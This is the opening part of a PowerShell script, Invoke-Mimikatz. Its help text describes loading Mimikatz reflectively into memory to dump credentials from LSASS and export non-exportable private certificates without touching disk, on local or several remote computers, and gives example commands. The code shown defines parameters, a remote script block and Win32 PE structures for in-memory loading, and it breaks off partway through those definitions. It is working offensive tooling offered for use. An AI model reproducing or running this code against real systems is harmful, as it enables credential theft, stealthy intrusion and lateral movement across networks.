function Invoke-Mimikatz
{
<#
.SYNOPSIS

This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
dump credentials without ever writing the mimikatz binary to disk. 
The script has a ComputerName parameter which allows it to be executed against multiple computers.

This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Version: 1.5
ReflectivePEInjection version: 1.1
Mimikatz version: 2.0 alpha (2/16/2015)

.DESCRIPTION

Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
functionality provided with Mimikatz.

.PARAMETER DumpCreds

Switch: Use mimikatz to dump credentials out of LSASS.

.PARAMETER DumpCerts

Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).

.PARAMETER Command

Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.
	
.EXAMPLE

Execute mimikatz on the local computer to dump certificates.
Invoke-Mimikatz -DumpCerts

.EXAMPLE

Execute mimikatz on two remote computers to dump credentials.
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")

.EXAMPLE

Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"

.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com

.LINK

Blog: http://clymb3r.wordpress.com/
Benjamin DELPY blog: http://blog.gentilkiwi.com

Github repo: https://github.com/clymb3r/PowerShell
mimikatz Github repo: https://github.com/gentilkiwi/mimikatz

Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/

#>

[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $DumpCreds,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
